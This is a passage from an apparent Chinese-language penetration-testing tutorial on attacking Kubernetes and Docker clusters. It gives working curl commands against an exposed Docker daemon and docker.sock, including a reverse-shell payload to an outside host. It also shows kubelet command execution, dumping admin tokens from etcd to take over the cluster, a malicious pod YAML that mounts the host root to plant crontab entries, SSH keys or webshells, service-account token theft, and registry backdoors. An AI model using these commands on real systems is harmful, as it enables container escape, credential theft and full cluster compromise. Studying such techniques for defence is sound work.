\u83b7\u53d6\u5230\u4e00\u4e2aid \u7136\u540e\u8bf7\u6c42\u8fd9\u4e2aid,\u6267\u884c\u6b64\u547d\u4ee4 curl -X POST \"http://ip:2375/exec/{id}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\" \u5c31\u50cf\u8fd9\u6837\uff1a\uff08\u56fe\u7247\u5f15\u7528\u81eafreebuf\uff09 ** \u76f4\u63a5\u5229\u7528\u73b0\u6210\u7684docker.sock**\u200b \u5982\u679c\u6211\u4eec\u5165\u4fb5\u4e86\u4e00\u4e2adocker\u5bb9\u5668\uff0c\u8fd9\u4e2adocker\u5bb9\u5668\u91cc\u9762\u6709docker.sock(\u5e38\u7528\u8def\u5f84/var/run/docker.sock)\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u6b64\u6587\u4ef6\u63a7\u5236docker daemon\u3002 \u628a\u4e0a\u4e00\u5c0f\u8282\u7684\u547d\u4ee4\u6539\u6539\u5c31\u884c\uff0c\u52a0\u4e00\u4e2a\u2014unix-socket\u53c2\u6570\u3002 curl -s --unix-socket /var/run/docker.sock -X POST \"http://docker_daemon_ip/containers/{container_id}/exec\" -H \"Content-Type: application/json\" --data-binary '{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/xxxx/1234 0>&1\"]}' curl -s --unix-socket /var/run/docker.sock -X POST \"http://docker_daemon_ip/exec/{id}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\" \u4e00\u822c\u6765\u8bf4docker.sock\u662f\u5b58\u5728\u4e8edocker daemon\u670d\u52a1\u7aef\u7684\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u4eba\u5458\u60f3\u5728docker\u5bb9\u5668\u91cc\u8fd0\u884cdocker\u547d\u4ee4\uff0c\u5c31\u9700\u8981\u628a\u5bbf\u4e3b\u673a\u7684docker.sock\u6302\u8f7d\u5230\u5bb9\u5668\u5185\u90e8\u4e86\uff0c\u8fd9\u5c31\u7ed9\u4e86\u6211\u4eecdocker\u9003\u9038\u7684\u53ef\u4e58\u4e4b\u673a\u3002 kubelet \u672a\u6388\u6743 kubelet\u548ckubectl\u7684\u533a\u522b\uff1f kubelet\u662f\u5728Node\u4e0a\u7528\u4e8e\u7ba1\u7406\u672c\u673aPod\u7684\uff0ckubectl\u662f\u7528\u4e8e\u7ba1\u7406\u96c6\u7fa4\u7684\u3002kubectl\u5411\u96c6\u7fa4\u4e0b\u8fbe\u6307\u4ee4\uff0cNode\u4e0a\u7684kubelet\u6536\u5230\u6307\u4ee4\u540e\u4ee5\u6b64\u6765\u7ba1\u7406\u672c\u673aPod\u3002 kubelet\u5bf9\u5e94\u7684API\u7aef\u53e3\u9ed8\u8ba4\u572810250\uff0c\u8fd0\u884c\u5728\u96c6\u7fa4\u4e2d\u6bcf\u53f0Node\u4e0a\uff0ckubelet \u7684\u914d\u7f6e\u6587\u4ef6\u5728node\u4e0a\u7684/var/lib/kubelet/config.yaml \u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8fd9\u4e24\u4e2a\u9009\u9879\uff1a\u7b2c\u4e00\u4e2a\u9009\u9879\u7528\u4e8e\u8bbe\u7f6ekubelet api\u80fd\u5426\u88ab\u533f\u540d\u8bbf\u95ee\uff0c\u7b2c\u4e8c\u4e2a\u9009\u9879\u7528\u4e8e\u8bbe\u7f6ekubelet api\u8bbf\u95ee\u662f\u5426\u9700\u8981\u7ecf\u8fc7Api server\u8fdb\u884c\u6388\u6743\uff08\u8fd9\u6837\u5373\u4f7f\u533f\u540d\u2f64\u6237\u80fd\u591f\u8bbf\u95ee\u4e5f\u4e0d\u5177\u5907\u4efb\u4f55\u6743\u9650\uff09\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ckubelet\u914d\u7f6e\u6587\u4ef6\u5c31\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95eekubelet\u5bf9\u5e94API\u7aef\u53e3\u4f1a\u663e\u793a\u8ba4\u8bc1\u4e0d\u901a\u8fc7 \u6211\u4eec\u5c06\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0cauthentication-anonymous-enabled\u6539\u4e3atrue\uff0cauthorization-mode\u6539\u4e3aAlwaysAllow\uff0c\u518d\u4f7f\u7528\u547d\u4ee4systemctl restart kubelet \u91cd\u542fkubelet\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0kubelet\u672a\u6388\u6743\u8bbf\u95ee \u5173\u4e8eauthorization-mode\u8fd8\u6709\u4ee5\u4e0b\u7684\u914d\u7f6e --authorization-mode=ABAC \u57fa\u4e8e\u5c5e\u6027\u7684\u8bbf\u95ee\u63a7\u5236\uff08ABAC\uff09\u6a21\u5f0f\u5141\u8bb8\u4f60 \u4f7f\u7528\u672c\u5730\u6587\u4ef6\u914d\u7f6e\u7b56\u7565\u3002 --authorization-mode=RBAC \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\uff08RBAC\uff09\u6a21\u5f0f\u5141\u8bb8\u4f60\u4f7f\u7528 Kubernetes API \u521b\u5efa\u548c\u5b58\u50a8\u7b56\u7565\u3002 --authorization-mode=Webhook WebHook \u662f\u4e00\u79cd HTTP \u56de\u8c03\u6a21\u5f0f\uff0c\u5141\u8bb8\u4f60\u4f7f\u7528\u8fdc\u7a0b REST \u7aef\u70b9\u7ba1\u7406\u9274\u6743\u3002 --authorization-mode=Node \u8282\u70b9\u9274\u6743\u662f\u4e00\u79cd\u7279\u6b8a\u7528\u9014\u7684\u9274\u6743\u6a21\u5f0f\uff0c\u4e13\u95e8\u5bf9 kubelet \u53d1\u51fa\u7684 API \u8bf7\u6c42\u6267\u884c\u9274\u6743\u3002 --authorization-mode=AlwaysDeny \u8be5\u6807\u5fd7\u963b\u6b62\u6240\u6709\u8bf7\u6c42\u3002\u4ec5\u5c06\u6b64\u6807\u5fd7\u7528\u4e8e\u6d4b\u8bd5\u3002 --authorization-mode=AlwaysAllow \u6b64\u6807\u5fd7\u5141\u8bb8\u6240\u6709\u8bf7\u6c42\u3002\u4ec5\u5728\u4f60\u4e0d\u9700\u8981 API \u8bf7\u6c42 \u7684\u9274\u6743\u65f6\u624d\u4f7f\u7528\u6b64\u6807\u5fd7\u3002 \u5728\u6211\u4eec\u53d1\u73b0kubelet\u672a\u6388\u6743\u540e\uff0c\u53ef\u4ee5\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c\u62ff\u5230\u5165\u53e3\u70b9 ** \u6267\u884cPod\u5185\u547d\u4ee4**\u200b \u5982\u679c\u6709kubelet\u672a\u6388\u6743\uff0c\u90a3\u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u547d\u4ee4\u5728Pod\u5185\u6267\u884c\u547d\u4ee4 curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d \"cmd=command\" \u5176\u4e2d\u7684\u53c2\u6570\u53ef\u4ee5\u4ecehttps\\://node_ip:10250/pods \u4e2d\u83b7\u53d6 \u53ef\u4ee5\u76f4\u63a5\u56de\u663e\u547d\u4ee4\u7ed3\u679c\uff0c\u5f88\u65b9\u4fbf ** \u83b7\u53d6\u5bb9\u5668\u5185service account\u51ed\u636e**\u200b \u5982\u679c\u80fd\u5728Pod\u5185\u6267\u884c\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u83b7\u53d6Pod\u91ccservice account\u7684\u51ed\u636e\uff0c\u4f7f\u7528Pod\u4e0a\u7684service account\u51ed\u636e\u53ef\u4ee5\u7528\u6765\u6a21\u62dfPod\u4e0a\u7684\u670d\u52a1\u8d26\u6237\u8fdb\u884c\u64cd\u4f5c\uff0c\u5177\u4f53\u5229\u7528\u65b9\u6cd5\u89c1\u4e0b\u9762\u7684\u5c0f\u8282\u3002 etcd \u672a\u6388\u6743 etcd\u662fk8s\u96c6\u7fa4\u4e2d\u7684\u6570\u636e\u5e93\u7ec4\u4ef6\uff0c\u9ed8\u8ba4\u76d1\u542c\u57282379\u7aef\u53e3\uff0c\u5982\u679c2379\u5b58\u5728\u672a\u6388\u6743\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u901a\u8fc7etcd\u67e5\u8be2\u96c6\u7fa4\u5185\u7ba1\u7406\u5458\u7684token\uff0c\u7136\u540e\u7528\u8fd9\u4e2atoken\u8bbf\u95eeapi server\u63a5\u7ba1\u96c6\u7fa4\u3002 etcd\u6709v2\u548cv3\u4e24\u4e2a\u7248\u672c\uff0ck8s\u7528\u7684\u662fv3\u7248\u672c\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u8bbf\u95eeetcd\u7684\u65f6\u5019\u9700\u8981\u7528\u547d\u4ee4ETCDCTL_API=3\u6765\u6307\u5b9aetcd\u7248\u672c\u3002 \u6211\u4eec\u60f3\u8981\u5229\u7528etcd\u672a\u6388\u6743\uff0c\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u5de5\u5177\u53eb\u505aetcdctl\uff0c\u5b83\u662f\u7528\u6765\u7ba1\u7406etcd\u6570\u636e\u5e93\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5728github\u4e0a\u4e0b\u8f7d\u5b83 https://github.com/etcd-io/etcd/releases/ \"\u5728\u542f\u52a8etcd\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a --client-cert-auth \u53c2\u6570\u6253\u5f00\u8bc1\u4e66\u6821\u9a8c\uff0c\u5e76\u4e14\u6ca1\u6709\u901a\u8fc7iptables / \u9632\u706b\u5899\u7b49\u5b9e\u65bd\u8bbf\u95ee\u63a7\u5236\uff0cetcd\u7684\u63a5\u53e3\u548c\u6570\u636e\u5c31\u4f1a\u76f4\u63a5\u66b4\u9732\u7ed9\u5916\u90e8\u9ed1\u5ba2\"\u2014\u2014\u7231\u5947\u827a\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3 \u590d\u73b0\u73af\u5883\u6211\u4e5f\u61d2\u5f97\u642d\u4e86\uff0c\u6211\u4eec\u5c31\u5728\u6388\u6743\u60c5\u51b5\u4e0b\u6765\u590d\u73b0\u8fd9\u4e2a\u6d1e\u5427\uff01\uff08 \u9996\u5148\uff0c\u5982\u679c\u6211\u4eec\u5728\u6ca1\u6709\u8bc1\u4e66\u6587\u4ef6\u7684\u524d\u63d0\u4e0b\u76f4\u63a5\u8bbf\u95ee2375\u7aef\u53e3\uff0c\u662f\u8c03\u7528\u4e0d\u4e86etcd\u5e94\u7528\u7684,\u4f1a\u63d0\u793aX509\u8bc1\u4e66\u9519\u8bef\u3002 ETCDCTL_API=3 ./etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only \u6211\u4eec\u9700\u8981\u5c06\u4ee5\u4e0b\u6587\u4ef6\u52a0\u5165\u73af\u5883\u53d8\u91cf\u624d\u80fd\u8bbf\u95ee\uff08\u5982\u679c\u6709\u672a\u6388\u6743\uff0c\u90a3\u4e48\u4e0d\u7528\u5e26\u8bc1\u4e66\u90fd\u80fd\u8bbf\u95ee\uff09 export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key ** \u67e5\u8be2\u7ba1\u7406\u5458token**\u200b \u56fe\u7247\u5f15\u7528\u81ea\u7231\u5947\u827a\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5728etcd\u91cc\u67e5\u8be2\u7ba1\u7406\u5458\u7684token\uff0c\u7136\u540e\u4f7f\u7528\u8be5token\u914d\u5408kubectl\u6307\u4ee4\u63a5\u7ba1\u96c6\u7fa4\u3002 etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/ \u5982\u679c\u67e5\u8be2\u7ed3\u679c\u6709\u654f\u611f\u8d26\u6237\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u53bb\u83b7\u53d6\u4ed6\u7684token etdctl --endpoints=https://etcd_ip:2375/ get /registry/secrets/default/admin-token-55712 \u62ff\u5230token\u4ee5\u540e\uff0c\u7528kubectl\u63a5\u7ba1\u96c6\u7fa4 kubectl --insecure-skip-tls-verify -s https://master_ip:6443/ --token=\"xxxxxx\" get nodes \u6267\u884c *\u76ee\u5f55\u6302\u8f7d\u9003\u9038 \u8fd9\u4e2a\u6280\u672f\u662f\u7efc\u5408\u4e86\u6267\u884c\u3001\u6301\u4e45\u5316\u3001\u6743\u9650\u63d0\u5347\u7684\u4e00\u4e2a\u653b\u51fb\u65b9\u6cd5\uff0c\u4e3a\u4e86\u7701\u4e8b\uff0c\u5c31\u653e\u5728\u8fd9\u91cc\u4e00\u5757\u8bf4\u4e86\u3002 \u9996\u5148\uff0c\u5728\u6211\u4eec\u83b7\u53d6\u4e86api server\u63a7\u5236\u6743\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efaPod\uff0c\u5e76\u5728\u5bb9Pod\u5185\u90e8\u6267\u884c\u547d\u4ee4\u3002\u5982\u679c\u6211\u4eec\u5728\u521b\u5efaPod\u65f6\uff0c\u5c06Node\u8282\u70b9\u7684\u6839\u76ee\u5f55\u6302\u8f7d\u5230Pod\u7684\u67d0\u4e2a\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u6211\u4eec\u80fd\u5728Pod\u5185\u90e8\u6267\u884c\u547d\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u6302\u8f7d\u5230Pod\u4e0b\u7684Node\u8282\u70b9\u6839\u76ee\u5f55\u4e2d\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6211\u4eec\u5199\u5165\u6076\u610fcrontab\u3001web shell\u3001ssh\u516c\u94a5\uff0c\u4fbf\u53ef\u4ee5\u4ecePod\u9003\u9038\u5230\u5bbf\u4e3b\u673aNode\uff0c\u83b7\u53d6Node\u63a7\u5236\u6743\u3002 \u5177\u4f53\u590d\u73b0\u5982\u4e0b \u5148\u521b\u5efa\u4e00\u4e2a\u6076\u610fPod \u9996\u5148\u6211\u4eec\u521b\u5efa\u6076\u610fPod\uff0c\u53ef\u4ee5\u76f4\u63a5\u521b\u5efaPod\uff0c\u4e5f\u53ef\u4ee5\u7528Deployment\u521b\u5efa\u3002 \u65e2\u7136\u63d0\u5230\u521b\u5efaPod\uff0c\u90a3\u4e48\u5c31\u591a\u63d0\u4e00\u53e5\uff1a\u76f4\u63a5\u521b\u5efaPod\u548c\u7528Deployment\u521b\u5efaPod\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f Deployment\u53ef\u4ee5\u66f4\u65b9\u4fbf\u7684\u8bbe\u7f6ePod\u7684\u6570\u91cf\uff0c\u65b9\u4fbfPod\u6c34\u5e73\u6269\u5c55\u3002 Deployment\u62e5\u6709\u66f4\u52a0\u7075\u6d3b\u5f3a\u5927\u7684\u5347\u7ea7\u3001\u56de\u6eda\u529f\u80fd,\u5e76\u4e14\u652f\u6301\u6eda\u52a8\u66f4\u65b0\u3002 \u4f7f\u7528Deployment\u5347\u7ea7Pod\u53ea\u9700\u8981\u5b9a\u4e49Pod\u7684\u6700\u7ec8\u72b6\u6001\uff0ck8s\u4f1a\u4e3a\u4f60\u6267\u884c\u5fc5\u8981\u7684\u64cd\u4f5c\u3002 \u5982\u679c\u521b\u5efa\u4e00\u4e2a\u5c0f\u73a9\u610f\uff0c\u90a3\u4e48\u76f4\u63a5\u521b\u5efaPod\u5c31\u884c\u4e86\uff0c\u6ca1\u5fc5\u8981\u7528deployment\u3002 _______________________________________ \u7528Pod\u521b\u5efa apiVersion: v1 kind: Pod metadata: name: evilpod spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / __________________________________ \u7528deployment\u521b\u5efa apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx-test spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / \u5c06\u4ee5\u4e0a\u6587\u672c\u5199\u5165\u5230\u4e00\u4e2ayaml\u6587\u4ef6\u4e2d\uff0c\u7136\u540e\u6267\u884c kubectl apply -f xxxxx.yaml \u5982\u679c\u662fapi server\u672a\u6388\u6743\u6253\u8fdb\u53bb\u7684\uff0c\u53ef\u80fd\u8981\u901a\u8fc7-s\u53c2\u6570\u8bbe\u7f6e\u4e00\u4e0bapi server\u7684ip\u548c\u5730\u5740\uff1akubectl -s http://master_ip:8080 command \u8fd9\u91cc\u518d\u591a\u5634\u4e00\u53e5 kubectl apply \u548c kubectl create \u8fd9\u4e24\u4e2a\u547d\u4ee4\u7684\u533a\u522b \u4e24\u4e2a\u547d\u4ee4\u90fd\u53ef\u4ee5\u7528\u4e8e\u521b\u5efapod\uff0capply\u66f4\u503e\u5411\u4e8e\u201d\u7ef4\u62a4\u8d44\u6e90\u201c\uff0c\u53ef\u4ee5\u7528\u4e8e\u66f4\u65b0\u5df2\u6709Pod\uff1b\u800ccreate\u66f4\u503e\u5411\u4e8e\u201d\u76f4\u63a5\u521b\u5efa\u201c\uff0c\u4e0d\u7ba1\u4e09\u4e03\u4e8c\u5341\u4e00\u7ed9\u6211\u521b\u5efa\u5c31\u5b8c\u4e8b\u4e86 \u7b80\u800c\u8a00\u4e4b\uff0c\u5f53\u4e00\u4e2a\u8d44\u6e90\u5df2\u7ecf\u5b58\u5728\u65f6\uff0c\u7528create\u4f1a\u62a5\u9519\uff0c\u800capply\u4e0d\u4f1a\u62a5\u9519 \u2014\u2014\u2014\u2014\u2014\u2014ref:https://stackoverflow.com/questions/47369351/kubectl-apply-vs-kubectl-create \u6076\u610f\u5bb9\u5668\u5c31\u521b\u5efa\u597d\u4e86 \u521b\u5efa\u597d\u4e86\u540e\u4f7f\u7528\u547d\u4ee4 kubectl get pods \u83b7\u53d6\u6076\u610fpod\u7684\u540d\u5b57 \u7136\u540e\u4f7f\u7528\u547d\u4ee4 kubectl exec -it evilpodname /bin/bash \u8fdb\u5165pod\u5185\u90e8shell\uff0c\u7136\u540e\u5411\u6302\u8f7d\u5230Pod\u5185\u90e8\u7684Node\u6839\u76ee\u5f55\u4e2d\u5199\u5165\u6076\u610fcrontab\u3001ssh\u516c\u94a5\u3001webshell\u5373\u53ef\u62ff\u5230node\u7684shell\u3002 \u5927\u81f4\u6d41\u7a0b\u4e00\u5f20\u56fe\u8868\u793a\u5982\u4e0b \u5229\u7528Service Account\u8fde\u63a5API Server\u6267\u884c\u6307\u4ee4 k8s\u6709\u4e24\u79cd\u8d26\u6237\uff1a\u7528\u6237\u8d26\u6237\u548c\u670d\u52a1\u8d26\u6237\uff0c\u7528\u6237\u8d26\u6237\u88ab\u7528\u4e8e\u4eba\u4e0e\u96c6\u7fa4\u4ea4\u4e92\uff08\u5982\u7ba1\u7406\u5458\u7ba1\u7406\u96c6\u7fa4\uff09\uff0c\u670d\u52a1\u8d26\u6237\u7528\u4e8ePod\u4e0e\u96c6\u7fa4\u4ea4\u4e92\uff08\u5982Pod\u8c03\u7528api server\u63d0\u4f9b\u7684\u4e00\u4e9bAPI\u8fdb\u884c\u4e00\u4e9b\u6d3b\u52a8\uff09 \u5982\u679c\u6211\u4eec\u5165\u4fb5\u4e86\u4e00\u53f0\u6709\u7740\u9ad8\u6743\u9650\u670d\u52a1\u8d26\u6237\u7684Pod\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u5b83\u5bf9\u5e94\u7684\u670d\u52a1\u8d26\u6237\u8eab\u4efd\u8c03\u7528api server\u5411\u96c6\u7fa4\u4e0b\u8fbe\u547d\u4ee4\u3002 pod\u7684serviceaccount\u4fe1\u606f\u4e00\u822c\u5b58\u653e\u4e8e/var/run/secrets/kubernetes.io/serviceaccount/\u76ee\u5f55\u4e0b \u4f46\u662f\u9ed8\u8ba4\u7684user\u6216\u8005service account\u5e76\u4e0d\u5177\u5907\u4efb\u4f55\u6743\u9650 \u8fd9\u662f\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2apod\u4f7f\u7528\u81ea\u8eabservice account(\u9ed8\u8ba4\u4e3a\u5f53\u524d\u547d\u540d\u7a7a\u95f4\u7684default\u8d26\u6237)\u53bb\u8bf7\u6c42api server\u8fd4\u56de\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53d1\u73b0\u662f\u6ca1\u6709\u6743\u9650\u7684\u3002 $ CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt $ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) $ NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace) $ curl --cacert $CA_CERT -H \"Authorization: Bearer $TOKEN\" \"https://192.168.111.20:6443/version/\" \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": {}, \"status\": \"Failure\", \"message\": \"version is forbidden: User \\\"system:serviceaccount:default:default\\\" cannot list resource \\\"version\\\" in API group \\\"\\\" at the cluster scope\", \"reason\": \"Forbidden\", \"details\": { \"kind\": \"version\" }, \"code\": 403 \u90a3\u4e48\u6211\u73b0\u5728\u521b\u5efa\u4e00\u4e2a\u9ad8\u6743\u9650service account \u5e76\u4f7f\u5176\u4e0e\u4e00\u4e2aPod\u76f8\u5173\u8054\uff0c\u6765\u590d\u73b0\u4e00\u4e0b\u8fd9\u4e2a\u653b\u51fb\u624b\u6cd5 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u9ad8\u6743\u9650service account kubectl create serviceaccount niubi #\u521b\u5efaservice account\uff1aniubi kubectl create clusterrolebinding cluster-admin-niubi --clusterrole=cluster-admin --serviceaccount=default:niubi #\u628aniubi\u653e\u5165\u96c6\u7fa4\u7ba1\u7406\u5458\u7ec4\uff0c\u76f8\u5f53\u4e8e\u7ed9\u4e86\u5b83\u9ad8\u6743\u9650 \u7136\u540e\u5c06service account\u4e0epod\u76f8\u5173\u8054 \u5728\u521b\u5efaPod\u7684yaml\u6587\u4ef6\u4e2d\u7684spec\u9879\u4e2d\u8f93\u5165 serviceAccountName: niubi \u518d\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u53ef\u4ee5\u8c03\u7528api server\u4e86 \u6301\u4e45\u5316 \u8fd9\u91cc\u7684\u6301\u4e45\u5316\u662f\u6307\u5982\u4f55\u5728Pod\u4e2d\u6301\u4e45\u5316\u3001\u5982\u4f55\u5728Node\u4e2d\u6301\u4e45\u5316\u3001\u5982\u4f55\u5728\u96c6\u7fa4\u4e2d\u6301\u4e45\u5316\u3002 \u5982\u4f55\u5728Node\u4e2d\u6301\u4e45\u5316\uff0c\u5728\u4e0a\u4e00\u5c0f\u8282\u4e2d\u5df2\u7ecf\u63d0\u5230\u8fc7\u4e00\u4e9b\uff1a\u901a\u8fc7\u5199\u5165crontab\uff0cssh\u516c\u94a5\uff0cwebshell\u5b9e\u73b0\uff0c\u4f46\u4e2a\u4eba\u89c9\u5f97\u8fd9\u51e0\u4e2a\u624b\u6bb5\u4e0e\u5176\u8bf4\u662f\u6301\u4e45\u5316\uff0c\u4e0d\u5982\u8bf4\u662f\u6743\u9650\u63d0\u5347\u66f4\u7b26\u5408\u5b9e\u9645\u4e00\u70b9\uff0c\u56e0\u4e3a\u8fd9\u51e0\u4e2a\u624b\u6bb5\u5728\u5b9e\u9645\u6e17\u900f\u4e2d\u90fd\u662f\u4e3a\u4e86\u4ecePod\u9003\u9038\u51fa\u6765\u83b7\u53d6Node\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728Pod\uff0cNode\uff0cMaster\u4e0a\u505a\u6301\u4e45\u5316\uff0c\u6709\u5927\u90e8\u5206\u65b9\u6cd5\u672c\u8d28\u4e0a\u662f\u201c\u5982\u4f55\u5728linux\u673a\u5668\u4e0a\u505a\u6301\u4e45\u5316\u201d\uff0c\u800c\u201c\u5982\u4f55\u5728linux\u673a\u5668\u4e0a\u505a\u6301\u4e45\u5316\u201d\u65b9\u6cd5\u5c31\u592a\u591a\u4e86\uff0c\u8fd9\u91cc\u5c31\u53ea\u7740\u91cd\u4e8e\u8bb2\u8ff0\u5728\u201c\u4e91\u73af\u5883\u201d\u91cc\u72ec\u6709\u7684\u6301\u4e45\u5316\u65b9\u6cd5\u3002 ** \u5728\u79c1\u6709\u955c\u50cf\u5e93\u4e2d\u690d\u5165\u540e\u95e8\uff08Pod\u6301\u4e45\u5316\uff09** \u200b \u5982\u679c\u63a5\u7ba1\u4e86\u5bf9\u65b9\u7684\u79c1\u6709\u955c\u50cf\u5e93\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5728\u5176\u5bf9\u8c61Dockerfile\u4e2d\u585e\u5165\u6076\u610f\u6307\u4ee4\uff08\u53cd\u5f39shell\u7b49\uff09 \u6216\u8005\u7f16\u8f91\u955c\u50cf\u7684\u6587\u4ef6\u5c42\u4ee3\u7801\uff0c\u5c06\u955c\u50cf\u4e2d\u539f\u59cb\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6216\u94fe\u63a5\u5e93\u6587\u4ef6\u66ff\u6362\u4e3a\u7cbe\u5fc3\u6784\u9020\u7684\u540e\u95e8\u6587\u4ef6\u4e4b\u540e\u518d\u6b21\u6253\u5305\u6210\u65b0\u7684\u955c\u50cf\u3002 ** \u4fee\u6539\u6838\u5fc3\u7ec4\u4ef6\u8bbf\u95ee\u6743\u9650\uff08\u96c6\u7fa4\u6301\u4e45\u5316\uff09** \u200b \u5305\u62ec\u4e14\u4e0d\u9650\u4e8e \u66f4\u6539\u914d\u7f6e\u66b4\u9732apiserver 8080\u7aef\u53e3\u3001\u66b4\u9732docker.sock\u3001\u66b4\u9732\u672a\u6388\u6743etcd\u3001\u66b4\u9732\u672a\u6388\u6743kubelet\u7b49\u4fee\u6539\u96c6\u7fa4\u914d\u7f6e\u6587\u4ef6\u8fbe\u5230\u6301\u4e45\u5316\u7684\u65b9\u6cd5\u3002 ** shadow api server\uff08\u96c6\u7fa4\u6301\u4e45\u5316/cdk\u5de5\u5177\u5229\u7528\uff09** \u200b \u90e8\u7f72\u4e00\u4e2a\u989d\u5916\u7684\u672a\u6388\u6743\u4e14\u4e0d\u8bb0\u5f55\u65e5\u5fd7\u7684api server\u4ee5\u4f9b\u6211\u4eec\u8fdb\u884c\u6301\u4e45\u5316\u3002 \u6211\u4eec\u53ef\u4ee5\u7528github\u4e0a\u4e13\u95e8\u7528\u4e8ek8s\u6e17\u900f\u7684\u5de5\u5177cdk\uff08\u8fd9\u4e2a\u5de5\u5177\u5f88\u5c4c\uff09\u6765\u505a\u5230\u8fd9\u4e00\u70b9 https://github.com/cdk-team/CDK/wiki/CDK-Home-CN https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver \u6743\u9650\u63d0\u5347 \u6307\u4ecepod\u62ff\u5230Node\u7684shell\uff0c\u6216\u8005\u62ff\u5230\u96c6\u7fa4\u63a7\u5236\u6743\u3002 \u4e0a\u9762\u7684\u5c0f\u8282\u63d0\u5230\u8fc7\u4e00\u4e9b\uff0c\u6bd4\u5982kubectl\u672a\u6388\u6743\u3001docker.sock\u3001\u6302\u8f7d\u76ee\u5f55\u3001\u9ad8\u6743\u9650Service account\u7b49\u65b9\u6cd5\u3002 \u9664\u6b64\u4e4b\u5916\u8fd8\u6709Docker\u3001k8s\u7684\u4e00\u4e9bCVE Docker\u9003\u9038\u5982CVE-2019-5736\uff0cCVE-2019-14271,CVE-2020-15257 k8s\u63d0\u6743\u5230\u63a5\u7ba1\u96c6\u7fa4\u7684\u5982CVE-2018-1002105,CVE-2020-8558 \u63a2\u6d4b \u662f\u5426\u5728\u5bb9\u5668\u73af\u5883\u4e2d \u6839\u76ee\u5f55\u4e0b/.dockerenv \u6587\u4ef6\u5b58\u5728\u5373docker\u73af\u5883 /proc/1/cgroup \u5185\u82e5\u5305\u542bdocker\u6216kube\u5b57\u7b26\u4e32\u5219\u662f\u5728docker\u73af\u5883\u6216k8s pod \u4e4b\u4e2d \u6ca1\u6709\u5e38\u89c1\u547d\u4ee4 \u67e5\u770b\u73af\u5883\u53d8\u91cf\u4e2d\u662f\u5426\u6709k8s\u6216\u8005docker\u5b57\u7b26\u4e32 \u67e5\u770b\u7aef\u53e3\u5f00\u653e\u60c5\u51b5\uff08netstat -anp\uff09\uff0c\u5982\u679c\u5f00\u653e\u4e86\u4e00\u4e9b\u7279\u6b8a\u7aef\u53e3\u59826443\u30018080\uff08api server\uff09,2379\uff08etcd\uff09,10250\u300110255\uff08kubelet\uff09\uff0c10256\uff08kube-proxy\uff09 \u90a3\u4e48\u53ef\u4ee5\u521d\u6b65\u5224\u5b9a\u4e3a\u662f\u5728k8s\u73af\u5883\u4e2d\u7684\u4e00\u53f0Node\u6216\u8005master\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4ea6\u53ef\u7528\u4e8e\u7aef\u53e3\u626b\u63cf\u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u4e3ak8s\u96c6\u7fa4\u4e2d\u7684\u673a\u5668 \u67e5\u770b\u5f53\u524d\u7f51\u6bb5\uff0ck8s\u4e2d 